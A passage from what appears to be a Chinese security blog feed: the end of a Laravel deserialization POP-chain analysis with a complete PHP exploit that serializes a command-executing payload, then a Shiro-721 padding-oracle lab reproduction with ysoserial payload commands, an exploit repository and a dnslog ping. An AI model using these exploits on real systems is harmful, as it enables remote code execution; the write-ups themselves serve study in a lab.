alt="在这里插入图片描述"><br>首先会判断binding数组中的$abstract是否存在，如果存在则返回$this-&gt;bindings[$abstract][‘concrete’]。最大的漏洞就出现在这里，通过整体跟踪，猜测开发者的本意应该是实例化Illuminate\Contracts\Http\Kernel这个类，但是在getConcrete这个方法中出了问题，导致可以利用php的反射机制实例化任意类。问题出在vendor/laravel/framework/src/Illuminate/Container/Container.php的704行，可以看到这里判断$this-&gt;bindings[$abstract])是否存在，若存在则返回$this-&gt;bindings[$abstract][‘concrete’]。$bindings是vendor/laravel/framework/src/Illuminate/Container/Container.php文件中Container类中的属性。因此我们只要寻找一个继承自Container的类，即可通过反序列化控制$this-&gt;bindings属性。而Illuminate\Foundation\Application恰好继承自Container类，这就是选择Illuminate\Foundation\Application对象放入$this-&gt;app的原因。由于我们已知$abstract变量为Illuminate\Contracts\Console\Kernel，所以我们只需通过反序列化定义Illuminate\Foundation\Application的$bindings属性存在键名为Illuminate\Contracts\Console\Kernel的二维数组就能进入该分支语句，返回我们要实例化的类名。在这里返回的是Illuminate\Foundation\Application类。<br>此处出getconcrete函数后进入<br><img src="https://img-blog.csdnimg.cn/20210430121550361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>跟进发现<br><img src="https://img-blog.csdnimg.cn/2021043013102699.png" alt="在这里插入图片描述"><br>此处判断$concrete和$abstract的值是否相等，此处显然不会相等，则进入make方法<br><img src="https://img-blog.csdnimg.cn/20210430121839911.png" alt="在这里插入图片描述"><br>在第二遍循环之后$concrete和$abstract的值则会相等然后进入build函数<br><img src="https://img-blog.csdnimg.cn/20210430122137724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到build中会通过reflectionclass反射机制实例化我们传入的类，最终$this-&gt;app[Kernel::class]返回的内容就是我们创建的Illuminate\Foundation\Application类的对象。<br>在返回一个对象之后，又调用了call方法。实际上Illuminate\Foundation\Application类没有call方法，但是它的父类Illuminate\Container\Container是有call方法的。因此，在这里会直接跳转到Illuminate\Container\Container类中的call方法。<br>之后进入到<br><img src="https://img-blog.csdnimg.cn/20210430123738266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>其中isCallableWithAtSign()方法是判断确定给定的字符串是否使用Class@method语法，不满足自然跳出，执行到callBoundMethod，跟进发现其只是判断是否为数组<br><img src="https://img-blog.csdnimg.cn/20210430123920702.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>跟进后面的匿名函数则可以发现<br><img src="https://img-blog.csdnimg.cn/20210430124243640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>中间代码看的不太懂只用看最后一行，它将我们传入的$parameters数组和$dependencies数组合并，其中$dependencies数组为空，而$parameters数组是我们可控的。最终也就是执行了<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">call_user_func_array(<span class="hljs-string">&#x27;xxx&#x27;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;xxx&#x27;</span>));<br></code></pre></div></td></tr></table></figure>到这pop链就已经分析完成了！！</li></ul><h2 id="构造反序列化payload"><a href="#构造反序列化payload" class="headerlink" title="构造反序列化payload"></a>构造反序列化payload</h2><p>直接放exp如下</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Foundation</span>\<span class="hljs-title">Testing</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">PendingCommand</span>&#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">command</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$parameters</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$app</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$command</span>, <span class="hljs-variable">$parameters</span>,<span class="hljs-variable">$class</span>,<span class="hljs-variable">$app</span></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;command = <span class="hljs-variable">$command</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;parameters = <span class="hljs-variable">$parameters</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;test=<span class="hljs-variable">$class</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;app=<span class="hljs-variable">$app</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Auth</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">GenericUser</span>&#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">attributes</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$attributes</span></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;attributes = <span class="hljs-variable">$attributes</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Foundation</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">Application</span>&#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">hasBeenBootstrapped</span> = <span class="hljs-title">false</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$bindings</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$bind</span></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;bindings=<span class="hljs-variable">$bind</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span>&#123;<br>    $<span class="hljs-title">genericuser</span> = <span class="hljs-title">new</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Auth</span>\<span class="hljs-title">GenericUser</span>(<br>        <span class="hljs-title">array</span>(<br>            &quot;<span class="hljs-title">expectedOutput</span>&quot;=&gt;<span class="hljs-title">array</span>(&quot;0&quot;=&gt;&quot;1&quot;),<br>            &quot;<span class="hljs-title">expectedQuestions</span>&quot;=&gt;<span class="hljs-title">array</span>(&quot;0&quot;=&gt;&quot;1&quot;)<br>             )<br>    );<br>    <span class="hljs-variable">$application</span> = <span class="hljs-keyword">new</span> Illuminate\Foundation\Application(<br>        <span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&quot;Illuminate\Contracts\Console\Kernel&quot;</span>=&gt;<br>                <span class="hljs-keyword">array</span>(<br>                    <span class="hljs-string">&quot;concrete&quot;</span>=&gt;<span class="hljs-string">&quot;Illuminate\Foundation\Application&quot;</span><br>                     )<br>             )<br>    );<br>    <span class="hljs-variable">$pendingcommand</span> = <span class="hljs-keyword">new</span> Illuminate\Foundation\Testing\PendingCommand(<br>        <span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;dir&#x27;</span>),<br>        <span class="hljs-variable">$genericuser</span>,<br>        <span class="hljs-variable">$application</span><br>    );<br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$pendingcommand</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>laravel</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>laravel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Apache Shiro 反序列化漏洞</title>
    <link href="/2021/04/30/2021-6-26-Shrio721/"/>
    <url>/2021/04/30/2021-6-26-Shrio721/</url>
    
    <content type="html"><![CDATA[<h2 id="Apache-Shiro-反序列化漏洞（Shiro-721-CVE-2016-4437）"><a href="#Apache-Shiro-反序列化漏洞（Shiro-721-CVE-2016-4437）" class="headerlink" title="Apache Shiro 反序列化漏洞（Shiro-721 CVE-2016-4437）"></a>Apache Shiro 反序列化漏洞（Shiro-721 CVE-2016-4437）</h2><blockquote><p>Apache Shiro是一个强大且易用的Java安全框架,其支持身份验证、授权、密码和会话管理等。使用Shiro的API可以快速、轻松地获得任何应用程序。</p><p>2021年02月01日，Apache Shiro发布1.7.1版本，修复了 Apache Shiro 中的一个身份验证绕过漏洞（CVE-2020-17523）。当Apache Shiro与Spring结合使用时，攻击者可以使用恶意HTTP请求来绕过Shiro的身份认证。成功利用此漏洞的攻击者可以绕过身份验证，成功访问后台。</p></blockquote><blockquote><p>Apache Shiro 存在高危代码执行漏洞。该漏洞是由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p></blockquote><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>复现环境: Apache Shiro 1.4.1 + tomcat:8-jre8<br>git下载shiro-720到本地环境</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/3ndz/</span>Shiro-<span class="hljs-number">721</span>.git<br></code></pre></div></td></tr></table></figure><p>对shiro-720进行编译</p><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm">cd <span class="hljs-keyword">Shiro-721/Docker</span><br><span class="hljs-keyword">docker </span><span class="hljs-keyword">build </span>-t <span class="hljs-keyword">shiro-721 </span>.<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210620132903892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>启动dokcer并将端口8080映射到主机端口9000上</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -p <span class="hljs-number">9000</span>:<span class="hljs-number">8080</span> -d shiro-<span class="hljs-number">721</span><br></code></pre></div></td></tr></table></figure><p>查看是否搭建成功</p><figure class="highlight ebnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker ps</span><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210620133006473.png" alt="在这里插入图片描述"></p><h4 id="通过自行编译1-4-1war-包放入tomcat容器中运行"><a href="#通过自行编译1-4-1war-包放入tomcat容器中运行" class="headerlink" title="通过自行编译1.4.1war 包放入tomcat容器中运行"></a>通过自行编译1.4.1war 包放入tomcat容器中运行</h4><p>安装maven</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> https://downloads.apache.org/maven/maven-<span class="hljs-number">3</span>/<span class="hljs-number">3</span>.<span class="hljs-number">6</span>.<span class="hljs-number">3</span>/binaries/apache-maven-<span class="hljs-number">3</span>.<span class="hljs-number">6</span>.<span class="hljs-number">3</span>-bin.tar.gz<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210620133119100.png" alt="在这里插入图片描述"></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">tar</span> zxvf  apache-maven-<span class="hljs-number">3</span>.<span class="hljs-number">6</span>.<span class="hljs-number">3</span>-bin.tar.gz  -C  /usr/local<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210620133234604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>添加环境变量</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">vi /etc/profile<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">MAVEN_HOME</span>=/usr/local/apache-maven-3.6.3<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$MAVEN_HOME</span>/bin:$PATH <br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210620133359541.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>进入父bash查看mvn版本</p><figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle"><span class="hljs-keyword">source</span> <span class="hljs-regexp">/etc/</span>profile<br>mvn -v <br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210620133509501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">vim  <span class="hljs-meta-keyword">/usr/</span>local/apache-maven<span class="hljs-number">-3.6</span><span class="hljs-number">.3</span><span class="hljs-meta-keyword">/conf/</span>settings.xml<br>找到mirrors节点添加阿里镜像库地址：<br><span class="hljs-params">&lt;mirrors&gt;</span><br>    <span class="hljs-params">&lt;mirror&gt;</span><br>      <span class="hljs-params">&lt;id&gt;</span>alimaven<span class="hljs-params">&lt;/id&gt;</span><br>      <span class="hljs-params">&lt;name&gt;</span>aliyun maven<span class="hljs-params">&lt;/name&gt;</span><br>      <span class="hljs-params">&lt;url&gt;</span>http:<span class="hljs-comment">//maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt;</span><br>      <span class="hljs-params">&lt;mirrorOf&gt;</span>central<span class="hljs-params">&lt;/mirrorOf&gt;</span>        <br>    <span class="hljs-params">&lt;/mirror&gt;</span><br>  <span class="hljs-params">&lt;/mirrors&gt;</span><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021062013361645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>从 Apache Shiro Gtihub 官方仓库自行下载漏洞影响版本(<a href="https://github.com/apache/shiro)%EF%BC%8C%E4%BD%BF%E7%94%A8">https://github.com/apache/shiro)，使用</a> Apache Maven(软件项目管理及自动构建工具) 编译构建生成 war Java 应用程序包。</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/apache/</span>shiro.git<br></code></pre></div></td></tr></table></figure><p>然后在执行</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> shiro<br><span class="hljs-attribute">git</span> checkout shiro-root-<span class="hljs-number">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><p>到这则搭建的没有问题<br><img src="https://img-blog.csdnimg.cn/20210620133711170.png" alt="在这里插入图片描述"></p><p>然后</p><figure class="highlight armasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs armasm"><span class="hljs-symbol">cd</span> samples/web<br><span class="hljs-keyword">mvn</span> install<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210620133930385.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将编译完成获取到的 samples-web-1.4.1.war 包( samples/target/中）拷贝到 Tomcat 的 webapps 目录下，启动tomcat即可。使用命令</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo docker cp 虚拟机里的war绝对路径 docker容器ID:<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/tomcat/</span>webapps<br></code></pre></div></td></tr></table></figure><p>然后打开http://自己虚拟机的IP:9000/samples-web-1.4.1/</p><p><img src="https://img-blog.csdnimg.cn/20210620134413592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="测试与结果"><a href="#测试与结果" class="headerlink" title="测试与结果"></a>测试与结果</h3><h4 id="复现步骤："><a href="#复现步骤：" class="headerlink" title="复现步骤："></a>复现步骤：</h4><h6 id="输入正确的用户名和密码登录网站（勾选Remember），并从cookie中获取RememberMe值。"><a href="#输入正确的用户名和密码登录网站（勾选Remember），并从cookie中获取RememberMe值。" class="headerlink" title="输入正确的用户名和密码登录网站（勾选Remember），并从cookie中获取RememberMe值。"></a>输入正确的用户名和密码登录网站（勾选Remember），并从cookie中获取RememberMe值。</h6><h6 id="使用RememberMe-cookie作为Padding-Oracle-Attack的前缀。"><a href="#使用RememberMe-cookie作为Padding-Oracle-Attack的前缀。" class="headerlink" title="使用RememberMe cookie作为Padding Oracle Attack的前缀。"></a>使用RememberMe cookie作为Padding Oracle Attack的前缀。</h6><h6 id="加密ysoserial的序列化有效负载，以通过Padding-Oracle-Attack制作精心制作的RememberMe。"><a href="#加密ysoserial的序列化有效负载，以通过Padding-Oracle-Attack制作精心制作的RememberMe。" class="headerlink" title="加密ysoserial的序列化有效负载，以通过Padding Oracle Attack制作精心制作的RememberMe。"></a>加密ysoserial的序列化有效负载，以通过Padding Oracle Attack制作精心制作的RememberMe。</h6><h6 id="请求带有新的RememberMe-cookie的网站，以执行反序列化攻击。"><a href="#请求带有新的RememberMe-cookie的网站，以执行反序列化攻击。" class="headerlink" title="请求带有新的RememberMe cookie的网站，以执行反序列化攻击。"></a>请求带有新的RememberMe cookie的网站，以执行反序列化攻击。</h6><h6 id="攻击者无需知道RememberMe加密的密码密钥。"><a href="#攻击者无需知道RememberMe加密的密码密钥。" class="headerlink" title="攻击者无需知道RememberMe加密的密码密钥。"></a>攻击者无需知道RememberMe加密的密码密钥。</h6><h4 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h4><h5 id="一-漏洞利用复现01"><a href="#一-漏洞利用复现01" class="headerlink" title="一.漏洞利用复现01"></a>一.漏洞利用复现01</h5><p>登录 Shiro 测试账户获取合法 Cookie（勾选Remember Me）：</p><p><img src="https://img-blog.csdnimg.cn/20210620184816156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>认证失败时（输入错误的用户名和密码），http响应页面中会显示出deleteMe的cookie:</p><p><img src="https://img-blog.csdnimg.cn/20210620185017886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入正确用户密码得到合法cookie：</p><p><img src="https://img-blog.csdnimg.cn/20210620190024434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>认证成功（输入正确的用户名和密码登录），http响应页面中不会显示deleteMe的cookie:</p><p><img src="https://img-blog.csdnimg.cn/202106201903079.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>根据以上条件我们的思路是在正常序列化数据（需要一个已知的用户凭证获取正常序列化数据）后利用 Padding Oracle 构造我们自己的数据（Java序列化数据后的脏数据不影响反序列化结果），此时会有两中情况:</p><p>构造的数据不能通过字符填充验证，返回deleteme;<br>构造的数据可以成功解密通过字符填充验证，之后数据可以正常反序列化，不返回deleteme的cookie.<br>这里输入正确的用户名和密码，并勾选Remeber ME。</p><p>登录成功后，访问<a href="http://192.168.1.14:8080/account/%EF%BC%8CF12%E5%BE%97%E5%88%B0Cookie%E4%B8%AD%E7%9A%84rememberMe%E5%80%BC">http://192.168.1.14:8080/account/，F12得到Cookie中的rememberMe值</a><br><img src="https://img-blog.csdnimg.cn/20210620190609805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>使用Java反序列化工具 ysoserial 生成 Payload:</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">java</span>  -jar ysoserial-master-<span class="hljs-number">6</span>eca<span class="hljs-number">5</span>bc<span class="hljs-number">740</span>-<span class="hljs-number">1</span>.jar   CommonsCollections<span class="hljs-number">1</span> &#x27;touch /tmp/test&#x27; &gt; payload.class<br></code></pre></div></td></tr></table></figure><p>通过git对其padding oracle attack  poc进行下载</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">git clone  https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/wuppp/</span>shiro_rce_exp.git<br></code></pre></div></td></tr></table></figure><p>通过 Padding Oracle Attack 生成 Evil Rememberme cookie:<br>此 exp 爆破时间较长，建议使用 ysoserial 生成较短的 payload 验证（如： ping 、 touch /tmp/test等），生成成功后将自动停止运行。</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">也可用<span class="hljs-keyword">python</span>自动化脚本<br><span class="hljs-keyword">cp</span> payload.class  shiro_rce_exp/<br><span class="hljs-keyword">cd</span> shiro_rce_exp/<br><span class="hljs-keyword">python</span> shiro_exp.<span class="hljs-keyword">py</span> http://自己的ip:docker的端口/account/ 此处为上面获取Rememberme cookie payload.class<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210625224820201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210625224946755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>使用Evil Rememberme cookie 认证进行反序列化攻击：复制该cookie，然后重放一下数据，即可成功执行命令,此处脚本爆破出正确的Rememberme cookie需要较长时间。<br><img src="https://img-blog.csdnimg.cn/20210625225948360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>还可以用dnslog提供的dns地址解析来验证</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">java</span>  -jar ysoserial-master-<span class="hljs-number">6</span>eca<span class="hljs-number">5</span>bc<span class="hljs-number">740</span>-<span class="hljs-number">1</span>.jar CommonsBeanutils<span class="hljs-number">1</span> <span class="hljs-string">&quot;ping y2xqmm.dnslog.cn&quot;</span> &gt; payload.class<br></code></pre></div></td></tr></table></figure><h4 id="方法二使用shiro550-721漏洞检查工具对其进行验证"><a href="#方法二使用shiro550-721漏洞检查工具对其进行验证" class="headerlink" title="方法二使用shiro550/721漏洞检查工具对其进行验证"></a>方法二使用shiro550/721漏洞检查工具对其进行验证</h4><p>工具下载地址：<br><a href="https://github.com/feihong-cs/ShiroExploit-Deprecated/releases/download/v2.51/ShiroExploit.V2.51.7z">https://github.com/feihong-cs/ShiroExploit-Deprecated/releases/download/v2.51/ShiroExploit.V2.51.7z</a></p><p><img 